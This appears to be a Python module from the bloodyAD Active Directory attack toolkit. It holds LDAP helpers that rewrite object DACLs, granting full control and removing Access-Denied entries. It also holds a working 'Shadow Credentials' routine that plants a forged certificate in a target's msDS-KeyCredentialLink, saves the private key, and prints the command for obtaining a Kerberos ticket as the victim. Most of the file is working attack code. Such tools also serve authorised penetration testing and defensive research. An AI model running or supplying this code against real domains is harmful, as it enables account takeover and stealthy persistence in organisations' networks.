from bloodyAD.formatters import ldaptypes, accesscontrol, cryptography, common
from bloodyAD.exceptions import NoResultError, ResultError, TooManyResultsError
import random, string, logging, json, sys, datetime, binascii
import ldap3
from ldap3.protocol.formatters.formatters import format_sid
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa


LOG = logging.getLogger("bloodyAD")
LOG.setLevel(logging.DEBUG)
handler = logging.StreamHandler(sys.stdout)
handler.setLevel(logging.DEBUG)
LOG.addHandler(handler)


def resolvDN(conn, identity, objtype=None):
    """
    Return the DN for the object based on the parameters identity
    Args:
        identity: sAMAccountName, DN, GUID or SID of the user
        objtype: None is default or GPO
    """

    if "dc=" in identity.lower():
        # identity is a DN, return as is
        # We do not try to validate it because it could be from another trusted domain
        return identity

    if "s-1-" in identity.lower():
        # We assume identity is an SID
        ldap_filter = f"(objectSid={identity})"

    elif "{" in identity:
        if objtype == "GPO":
            ldap_filter = f"(&(objectClass=groupPolicyContainer)(name={identity}))"
        else:
            # We assume identity is a GUID
            ldap_filter = f"(objectGUID={identity})"
    else:
        # By default, we assume identity is a sam account name
        ldap_filter = f"(sAMAccountName={identity})"

    naming_context = getDefaultNamingContext(conn)
    conn.search(naming_context, ldap_filter)

    entries = [e for e in conn.response if e.get("type", "") == "searchResEntry"]

    if len(entries) < 1:
        raise NoResultError(naming_context, ldap_filter)

    if len(entries) > 1:
        raise TooManyResultsError(naming_context, ldap_filter, entries)

    res = entries[0]["dn"]
    return res


def search(
    conn,
    base,
    ldap_filter="(objectClass=*)",
    search_scope=ldap3.BASE,
    attr=["*"],
    control_flag=accesscontrol.OWNER_SECURITY_INFORMATION,
):
    ldap_conn = conn.getLdapConnection()
    base_dn = resolvDN(ldap_conn, base)
    controls = ldap3.protocol.microsoft.security_descriptor_control(
        sdflags=control_flag
    )
    ldap_conn.search(
        base_dn,
        ldap_filter,
        search_scope=search_scope,
        attributes=attr,
        controls=controls,
    )
    if len(ldap_conn.entries) < 1:
        raise NoResultError(base_dn, ldap_filter)
    return ldap_conn.response


def setAttr(
    conn,
    identity,
    attribute,
    value,
    control_flag=accesscontrol.OWNER_SECURITY_INFORMATION,
):
    ldap_conn = conn.getLdapConnection()
    dn = resolvDN(ldap_conn, identity)
    controls = ldap3.protocol.microsoft.security_descriptor_control(
        sdflags=control_flag
    )
    ldap_conn.modify(dn, {attribute: [ldap3.MODIFY_REPLACE, value]}, controls)

    if ldap_conn.result["result"] == 0:
        LOG.debug(f"[+] {attribute} set successfully")
    else:
        raise ResultError(conn.result)


def getDefaultNamingContext(conn):
    naming_context = conn.server.info.other["defaultNamingContext"][0]
    return naming_context


def getObjectSID(conn, identity):
    """
    Get the SID for the given identity
    Args:
        identity: sAMAccountName, DN, GUID or SID of the object
    """
    ldap_conn = conn.getLdapConnection()
    object_dn = resolvDN(ldap_conn, identity)
    ldap_conn.search(
        object_dn,
        "(objectClass=*)",
        search_scope=ldap3.BASE,
        attributes="objectSid",
    )
    object_sid = ldap_conn.response[0]["raw_attributes"]["objectSid"][0]
    LOG.debug(f"[*] {identity} SID is: {format_sid(object_sid)}")
    return object_sid


def getSD(
    conn,
    object_id,
    ldap_attribute="nTSecurityDescriptor",
    control_flag=accesscontrol.DACL_SECURITY_INFORMATION,
):
    entry = search(conn, object_id, attr=ldap_attribute, control_flag=control_flag)[0]
    sd_data = entry["raw_attributes"][ldap_attribute]
    if len(sd_data) < 1:
        LOG.warning(
            "[!] No security descriptor has been returned, a new one will be created"
        )
        sd = accesscontrol.createEmptySD()
    else:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data[0])

    return sd, sd_data


def addRight(
    sd,
    user_sid,
    access_mask=accesscontrol.ACCESS_FLAGS["FULL_CONTROL"],
    object_type=None,
):
    user_aces = [
        ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
    ]
    new_ace = accesscontrol.createACE(user_sid, object_type, access_mask)
    if object_type:
        access_denied_type = ldaptypes.ACCESS_DENIED_OBJECT_ACE.ACE_TYPE
    else:
        access_denied_type = ldaptypes.ACCESS_DENIED_ACE.ACE_TYPE
    hasPriv = False

    for ace in user_aces:
        new_mask = new_ace["Ace"]["Mask"]
        mask = ace["Ace"]["Mask"]

        # Removes Access-Denied ACEs interfering
        if ace["AceType"] == access_denied_type and new_mask.hasPriv(mask["Mask"]):
            sd["Dacl"].aces.remove(ace)
            LOG.debug("[-] An interfering Access-Denied ACE has been removed:")
            LOG.info(json.dumps(accesscontrol.decodeAce(ace)))
        # Adds ACE if not already added
        elif mask.hasPriv(new_mask["Mask"]):
            hasPriv = True
            break

    if hasPriv:
        LOG.debug("[!] This right already exists")
    else:
        sd["Dacl"].aces.append(new_ace)

    isAdded = not hasPriv
    return isAdded


def delRight(
    sd,
    user_sid,
    access_mask=accesscontrol.ACCESS_FLAGS["FULL_CONTROL"],
    object_type=None,
):
    isRemoved = False
    user_aces = [
        ace for ace in sd["Dacl"].aces if ace["Ace"]["Sid"].getData() == user_sid
    ]
    if object_type:
        access_allowed_type = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    else:
        access_allowed_type = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE

    for ace in user_aces:
        mask = ace["Ace"]["Mask"]
        if ace["AceType"] == access_allowed_type and mask.hasPriv(access_mask):
            mask.removePriv(access_mask)
            LOG.debug("[-] Privilege Removed")
            if mask["Mask"] == 0:
                sd["Dacl"].aces.remove(ace)
            isRemoved = True

    if not isRemoved:
        LOG.debug("[!] No right to remove")
    return isRemoved


def addShadowCredentials(conn, identity, outfilePath=None):
    """
    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        outfilePath: file path for the generated certificate (default is current path)
    """
    ldap_conn = conn.getLdapConnection()
    target_dn = resolvDN(ldap_conn, identity)

    LOG.debug("Generating certificate")

    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name(
        [
            x509.NameAttribute(NameOID.COMMON_NAME, target_dn),
        ]
    )
    cert = (
        x509.CertificateBuilder()
        .subject_name(issuer)
        .issuer_name(issuer)
        .serial_number(x509.random_serial_number())
        .public_key(key.public_key())
        .not_valid_before(datetime.datetime.utcnow())
        .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=365))
        .sign(key, hashes.SHA256())
    )

    LOG.debug("Certificate generated")
    LOG.debug("Generating KeyCredential")

    keyCredential = cryptography.KEYCREDENTIALLINK_BLOB()
    keyCredential.keyCredentialLink_from_x509(cert)

    LOG.info(
        "[+] KeyCredential generated with following sha256 of RSA key: %s"
        % binascii.hexlify(keyCredential.getKeyID()).decode()
    )

    ldap_conn.search(
        target_dn,
        "(objectClass=*)",
        search_scope=ldap3.BASE,
        attributes=["msDS-KeyCredentialLink"],
    )

    key_dnbinary = common.DNBinary()
    key_dnbinary.fromCanonical(keyCredential.getData(), target_dn)
    new_values = ldap_conn.response[0]["raw_attributes"]["msDS-KeyCredentialLink"] + [
        str(key_dnbinary)
    ]

    LOG.debug("[*] Updating the msDS-KeyCredentialLink attribute of %s" % identity)

    ldap_conn.modify(
        target_dn,
        {"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, new_values]},
    )

    if ldap_conn.result["result"] == 0:
        LOG.debug("[+] msDS-KeyCredentialLink attribute of the target object updated")
        if outfilePath is None:
            path = "".join(
                random.choice(string.ascii_letters + string.digits) for i in range(8)
            )
            LOG.info(
                "No outfile path was provided. The certificate(s) will be"
                " stored with the filename: %s" % path
            )
        else:
            path = outfilePath

        key_path = path + "_priv.pem"
        with open(key_path, "wb") as f:
            f.write(
                key.private_bytes(
                    serialization.Encoding.PEM,
                    serialization.PrivateFormat.TraditionalOpenSSL,
                    serialization.NoEncryption(),
                )
            )
        cert_path = path + "_cert.pem"
        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))

        LOG.info("[+] Saved PEM certificate at path: %s" % cert_path)
        LOG.info("[+] Saved PEM private key at path: %s" % key_path)
        LOG.info(
            "A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools"
        )
        LOG.info("Run the following command to obtain a TGT:")
        LOG.info(
            "python3 PKINITtools/gettgtpkinit.py -cert-pem %s"
            " -key-pem %s %s/%s %s.ccache"
            % (cert_path, key_path, conn.conf.domain, identity, path)
        )

    else:
        raise ResultError(ldap_conn.result)


def delShadowCredentials(conn, identity, rsakey_sha256):
    """
    Delete the crafted certificate (Shadow Credentials) from the msDS-KeyCredentialLink attribute of the user provided
    Args:
        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
    """
    attr = "msDS-KeyCredentialLink"
    keyCreds = search(conn, identity, attr=attr)[0]["raw_attributes"][attr]
    newKeyCreds = []
    isFound = False
    for keyCred in keyCreds:
        key_raw = common.DNBinary(keyCred).value
        key_blob = cryptography.KEYCREDENTIALLINK_BLOB(key_raw)
        if rsakey_sha256 and key_blob.getKeyID() != binascii.unhexlify(rsakey_sha256):
            newKeyCreds.append(keyCred)
        else:
            isFound = True
            LOG.debug("[*] Key to delete found")

    if not isFound:
        LOG.warning("[!] No key found")

    setAttr(conn, identity, attr, newKeyCreds)
